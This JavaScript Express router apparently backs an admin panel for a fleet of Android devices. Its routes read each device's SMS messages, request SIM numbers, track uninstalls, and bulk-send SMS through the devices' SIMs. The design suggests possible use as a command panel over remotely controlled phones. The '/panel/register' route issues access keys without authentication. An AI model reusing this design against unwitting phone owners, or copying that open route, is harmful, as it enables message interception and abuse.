"use strict";

const express = require("express");
const config = require("../config");
const db = require("../database");
const u = require("../utils");
const hub = require("../hub");
const auth = require("../auth");
const relay = require("../relay");

const keysRouter = require("../admin/keys");
const rulesRouter = require("../admin/rules");
const growthRouter = require("../admin/growth");
const autoSenderRouter = require("../admin/autoSender");

const ah = (fn) => (req, res, next) => Promise.resolve(fn(req, res, next)).catch(next);
const router = express.Router();

const ALLOWED_COMMANDS = new Set([
  "ping",
  "wake",
  "fetch_number",
  "number",
  "sim_info",
  "refresh_telemetry",
  "telemetry",
  "sync_inbox",
  "reload_config",
]);

// ---------------------------------------------------------------- auth

async function authStatus(req, res) {
  const ident = (req.session && req.session.adminId) || auth.bearerIdentity(req);
  if (!ident) return res.json({ authenticated: false });

  const [role, name] = auth.splitIdent(ident);

  if (role === "admin") {
    const key = auth.adminMatch(name);
    if (!key) return res.json({ authenticated: false, role: "admin", reason: "unknown" });
    return res.json({
      authenticated: true,
      admin_id: key,
      role: "admin",
      username: key,
      expires_at: null,
      secret_source: config.SESSION_SECRET_SRC,
    });
  }

  const doc = await u.keyDoc(name);
  if (!doc || !u.keyActive(doc)) {
    return res.json({ authenticated: false, role: "key", reason: doc ? "expired" : "missing" });
  }
  res.json({
    authenticated: true,
    admin_id: doc.key || name,
    role: "key",
    username: doc.key || name,
    expires_at: u.serializeDt(doc.expires_at),
    secret_source: config.SESSION_SECRET_SRC,
  });
}

router.get("/admin/auth/status", ah(authStatus));
router.get("/panel/me", ah(authStatus));

router.post("/panel/login", ah(async (req, res) => {
  const ip = req.ip || "?";
  auth.loginThrottle(ip);

  const b = req.body || {};
  const user = String(b.login_id || b.username || "").trim();
  const pass = String(b.password || "");
  if (!user) throw new u.HttpError(400, "Login ID required");

  const adminName = auth.adminMatch(user);
  if (adminName && auth.constEq(pass, config.ADMINS[adminName] || "")) {
    auth.clearFails(ip);
    const ident = `admin:${adminName}`;
    req.session.adminId = ident;
    u.logEvent("admin_login", { username: adminName, ip }, null, adminName);
    return res.json({
      status: "ok",
      role: "admin",
      username: adminName,
      token: auth.makeToken(ident),
      expires_in: config.TOKEN_TTL,
      expires_at: null,
    });
  }

  auth.pushFail(ip);
  throw new u.HttpError(401, "Invalid Login ID or password");
}));

router.post("/panel/access", ah(async (req, res) => {
  const ip = req.ip || "?";
  auth.loginThrottle(ip);

  const k = u.normalizeKey((req.body || {}).key);
  if (k.length < 8) throw new u.HttpError(400, "Key daalo (TPC-XXXX-XXXX-XXXX)");

  const doc = await u.keyDoc(k);
  if (!doc) {
    auth.pushFail(ip);
    throw new u.HttpError(401, "Key galat hai");
  }
  if (doc.blocked) throw new u.HttpError(403, "Key block hai — admin se baat karo");
  if (doc.expires_at instanceof Date && doc.expires_at.getTime() <= Date.now()) {
    throw new u.HttpError(403, "Key expire ho gayi — admin se renew karvao");
  }

  auth.clearFails(ip);
  const ident = `key:${doc.key || k}`;
  req.session.adminId = ident;

  await db.panel_keys
    .updateOne(
      { _id: doc._id },
      { $set: { last_login_at: db.utcNow(), last_ip: ip }, $inc: { login_count: 1 } }
    )
    .catch(() => {});

  u.logEvent("key_login", { key: doc.key, ip });

  res.json({
    status: "ok",
    role: "key",
    username: doc.key,
    token: auth.makeToken(ident),
    expires_in: config.TOKEN_TTL,
    expires_at: u.serializeDt(doc.expires_at),
  });
}));

router.post("/panel/register", ah(async (req, res) => {
  const key = u.newKey();
  const now = db.utcNow();
  await db.panel_keys.insertOne({
    key,
    key_hash: u.keyHashFor(key),
    label: String((req.body || {}).label || "").slice(0, 60),
    phone: u.normalizeNumber((req.body || {}).phone) || "",
    created_at: now,
    expires_at: config.DEFAULT_KEY_DAYS
      ? new Date(now.getTime() + config.DEFAULT_KEY_DAYS * 86400000)
      : null,
    blocked: false,
    login_count: 0,
    last_login_at: null,
  });
  res.json({ status: "ok", key });
}));

router.post("/admin/logout", ah(async (req, res) => {
  const ident = (req.session && req.session.adminId) || auth.bearerIdentity(req);
  if (ident) u.logEvent("logout", { ident });
  req.session = null;
  res.json({ status: "ok" });
}));

router.get("/admin/session", ah(async (req, res) => {
  const ident = await auth.requirePanel(req);
  res.json({
    admin_id: ident.name,
    role: ident.role,
    via: req.session && req.session.adminId ? "session" : "token",
    secret_source: config.SESSION_SECRET_SRC,
  });
}));

// ---------------------------------------------------------------- sub-routers
// autoSender/growth pehle — warna `/admin/devices/:id/auto-sender` devices
// ke `/:device_id` handler me chala jayega.

router.use("/admin", autoSenderRouter);
router.use("/admin", growthRouter);
router.use("/admin/keys", keysRouter);
router.use("/admin/users", keysRouter);
router.use("/admin/rules", rulesRouter);

// ---------------------------------------------------------------- devices

router.get("/admin/devices", ah(async (req, res) => {
  await auth.requirePanelOrKey(req);
  const q = {};
  if (req.query.onboarded !== undefined) q.onboarded = req.query.onboarded === "true";

  const now = Date.now();
  const state = String(req.query.state || "");
  if (state === "live") {
    q.last_seen = { $gte: new Date(now - config.ONLINE_WINDOW_SECONDS * 1000) };
  } else if (state === "idle") {
    q.last_seen = {
      $lt: new Date(now - config.ONLINE_WINDOW_SECONDS * 1000),
      $gte: new Date(now - config.IDLE_AFTER_HOURS * 3600000),
    };
  } else if (state === "stale") {
    q.last_seen = {
      $lt: new Date(now - config.IDLE_AFTER_HOURS * 3600000),
      $gte: new Date(now - config.STALE_AFTER_DAYS * 86400000),
    };
  } else if (state === "uninstalled") {
    q.last_seen = { $lt: new Date(now - config.STALE_AFTER_DAYS * 86400000) };
  } else if (state === "gone") {
    q.install_state = "gone";
  } else if (state === "reinstall") {
    q.install_seq = { $gt: 1 };
  }

  if (req.query.q && String(req.query.q).trim()) {
    const rx = new RegExp(String(req.query.q).trim().replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "i");
    q.$or = [
      { device_name: rx },
      { short_id: rx },
      { phone_number: rx },
      { "telemetry.sim_number": rx },
      { android_id: rx },
    ];
  }

  const limit = Math.max(1, Math.min(parseInt(req.query.limit || 300, 10), 1000));
  const rows = await db.devices
    .find(q, { projection: { registration_id_hash: 0 } })
    .sort({ _id: -1 })
    .limit(limit)
    .toArray();

  res.json({ devices: rows.map((d) => u.viewDevice(d)), online_sockets: hub.hub.onlineCount });
}));

router.get("/admin/devices/:device_id", ah(async (req, res) => {
  await auth.requirePanelOrKey(req);
  res.json(u.viewDevice(await u.getDeviceOr404(req.params.device_id)));
}));

router.get("/admin/devices/:device_id/messages", ah(async (req, res) => {
  await auth.requirePanel(req);
  await u.getDeviceOr404(req.params.device_id);
  const limit = Math.max(1, Math.min(parseInt(req.query.limit || 500, 10), 1000));
  const rows = await db.messages
    .find({ device_id: String(req.params.device_id) })
    .sort({ _id: -1 })
    .limit(limit)
    .toArray();
  res.json({ messages: rows.map(u.serializeDocument) });
}));

router.get("/admin/devices/:device_id/events", ah(async (req, res) => {
  await auth.requirePanel(req);
  await u.getDeviceOr404(req.params.device_id);
  const limit = Math.max(1, Math.min(parseInt(req.query.limit || 100, 10), 500));
  const rows = await db.device_events
    .find({ device_id: String(req.params.device_id) })
    .sort({ _id: -1 })
    .limit(limit)
    .toArray();
  res.json({ events: rows.map(u.serializeDocument) });
}));

async function sendCommandTo(device, action) {
  const did = String(device._id);
  const online = hub.hub.online(did);
  const delivered = online ? await hub.sendCommand(did, action) : false;
  if (["fetch_number", "number", "sim_info", "refresh_telemetry"].includes(action)) {
    await db.devices
      .updateOne({ _id: device._id }, { $set: { number_requested_at: db.utcNow() } })
      .catch(() => {});
  }
  u.logEvent("device_command", { action, delivered, online }, did);
  return { online, delivered };
}

router.post("/admin/devices/:device_id/command", ah(async (req, res) => {
  await auth.requirePanel(req);
  let action = String((req.body || {}).action || "ping").trim().toLowerCase();
  if (!ALLOWED_COMMANDS.has(action)) action = "ping";

  const device = await u.getDeviceOr404(req.params.device_id);
  const { online, delivered } = await sendCommandTo(device, action);

  res.json({
    status: "ok",
    action,
    online,
    delivered,
    note: delivered ? "" : "device socket offline — online hone par apne aap milega",
  });
}));

router.post("/admin/devices/:device_id/refresh", ah(async (req, res) => {
  await auth.requirePanel(req);
  const device = await u.getDeviceOr404(req.params.device_id);
  const { online, delivered } = await sendCommandTo(device, "refresh_telemetry");
  res.json({ status: "ok", online, delivered, action: "refresh_telemetry" });
}));

router.post("/admin/devices/:device_id/ping", ah(async (req, res) => {
  await auth.requirePanel(req);
  const device = await u.getDeviceOr404(req.params.device_id);
  const online = hub.hub.online(String(device._id));
  const delivered = online ? await hub.sendCommand(String(device._id), "ping") : false;
  res.json({ status: "ok", online, delivered });
}));

router.post("/admin/devices/:device_id/wake", ah(async (req, res) => {
  await auth.requirePanel(req);
  const device = await u.getDeviceOr404(req.params.device_id);
  const online = hub.hub.online(String(device._id));
  const delivered = online ? await hub.sendCommand(String(device._id), "wake") : false;
  res.json({ status: "ok", online, delivered });
}));

router.post("/admin/devices/:device_id/rename", ah(async (req, res) => {
  const admin = await auth.requirePanel(req);
  const name = String((req.body || {}).device_name || "").trim().slice(0, 60);
  if (!name) throw new u.HttpError(400, "device_name required");

  const device = await u.getDeviceOr404(req.params.device_id);
  await db.devices.updateOne({ _id: device._id }, { $set: { device_name: name } });
  hub.broadcastDevice(String(device._id), { device_name: name });
  u.logEvent("device_rename", { device_name: name }, String(device._id), admin.name);

  res.json({ status: "ok", device_name: name });
}));

router.delete("/admin/devices/:device_id", ah(async (req, res) => {
  const admin = await auth.requirePanel(req);
  const device = await u.getDeviceOr404(req.params.device_id);
  const did = String(device._id);

  await Promise.all([
    db.messages.deleteMany({ device_id: did }).catch(() => {}),
    db.outbox.deleteMany({ device_id: did }).catch(() => {}),
    db.device_events.deleteMany({ device_id: did }).catch(() => {}),
  ]);
  await db.devices.deleteOne({ _id: device._id });
  hub.broadcastDevice(did, { deleted: true });
  u.logEvent("device_deleted", { short_id: u.deviceShortId(device) }, did, admin.name);

  res.json({ status: "ok" });
}));

// ------------------------------------------------------------------ send

router.post("/admin/send", ah(async (req, res) => {
  const admin = await auth.requirePanelOrKey(req);
  const b = req.body || {};
  const body = String(b.body || "").trim().slice(0, config.MAX_SMS_BODY);
  if (!body) throw new u.HttpError(400, "Message body required");

  const [targets, capped] = await hub.resolveTargets({
    target: b.target || "all",
    device_id: b.device_id,
  });

  if (!targets.length) {
    return res.json({
      status: "ok",
      queued: 0,
      delivered: 0,
      results: [],
      note: "koi device match nahi hua",
    });
  }

  const manualTo = u.normalizeNumber(b.to);
  const results = [];

  for (const device of targets) {
    const deviceId = String(device._id);
    const to = manualTo || u.resolveDeviceNumber(device);
    const slots = hub.slotsFor(b.sim_slots, device);
    let delivered = false;

    for (const slot of slots) {
      const [outboxId] = await hub.queueSms(
        deviceId,
        body,
        to,
        "panel",
        device.device_name || "Unknown",
        slot
      );
      if (hub.hub.online(deviceId) && (await hub.deliverOutboxRow(deviceId, outboxId))) {
        delivered = true;
      }
    }

    results.push({
      device_id: deviceId,
      device_name: device.device_name || "Unknown",
      short_id: u.deviceShortId(device),
      to,
      slots,
      delivered,
      queued: true,
    });
  }

  const deliveredN = results.filter((r) => r.delivered).length;
  u.logEvent(
    "bulk_send",
    { target: b.target, queued: results.length, delivered: deliveredN, slots: b.sim_slots },
    null,
    admin
  );

  const notes = [];
  if (deliveredN < results.length) {
    notes.push("kuch device offline hain — unka SMS outbox me queue hai, online hote hi jaayega");
  }
  if (Array.isArray(b.sim_slots) && b.sim_slots.length) {
    notes.push("selected SIMs: " + b.sim_slots.map((s) => `SIM ${Number(s) + 1}`).join(", "));
  }
  if (capped) notes.push(`fleet ${config.MAX_BROADCAST} se bada hai — sirf pehle ${config.MAX_BROADCAST} devices`);

  res.json({
    status: "ok",
    queued: results.length,
    delivered: deliveredN,
    capped,
    results,
    note: notes.join(" | "),
  });
}));

router.post("/admin/devices/:device_id/sms", ah(async (req, res) => {
  await auth.requirePanelOrKey(req);
  const b = req.body || {};
  const body = String(b.body || b.message || "").trim().slice(0, config.MAX_SMS_BODY);
  if (!body) throw new u.HttpError(400, "Message body required");

  const device = await u.getDeviceOr404(req.params.device_id);
  const deviceId = String(device._id);
  const to = u.normalizeNumber(b.to) || u.resolveDeviceNumber(device);
  const slots = hub.slotsFor(b.sim_slots, device);
  let delivered = false;

  for (const s of slots) {
    const [outboxId] = await hub.queueSms(deviceId, body, to, "panel", device.device_name || "", s);
    if (hub.hub.online(deviceId) && (await hub.deliverOutboxRow(deviceId, outboxId))) delivered = true;
  }

  res.json({ status: "ok", queued: slots.length, to, slots, delivered });
}));

router.post("/admin/devices/:device_id/push-outbox", ah(async (req, res) => {
  await auth.requirePanel(req);
  const device = await u.getDeviceOr404(req.params.device_id);
  const did = String(device._id);

  if (!hub.hub.online(did)) {
    return res.json({
      status: "ok",
      online: false,
      pushed: 0,
      note: "device offline — online hote hi apne aap jaayega",
    });
  }
  const n = await hub.pushOutbox(did);
  res.json({ status: "ok", online: true, pushed: n });
}));

router.get("/admin/messages", ah(async (req, res) => {
  await auth.requirePanelOrKey(req);
  const limit = Math.max(1, Math.min(parseInt(req.query.limit || 200, 10), 1000));
  const q = {};
  if (["in", "out"].includes(String(req.query.direction))) q.direction = String(req.query.direction);
  if (req.query.device_id) q.device_id = String(req.query.device_id);
  if (req.query.kind) q.kind = String(req.query.kind);

  const rows = await db.messages.find(q).sort({ _id: -1 }).limit(limit).toArray();
  res.json({ messages: rows.map(u.serializeDocument) });
}));

router.get("/admin/activity", ah(async (req, res) => {
  await auth.requirePanel(req);
  const limit = Math.max(1, Math.min(parseInt(req.query.limit || 100, 10), 500));
  const rows = await db.activity_logs.find().sort({ _id: -1 }).limit(limit).toArray();
  res.json({ activity: rows.map(u.serializeDocument) });
}));

module.exports = router;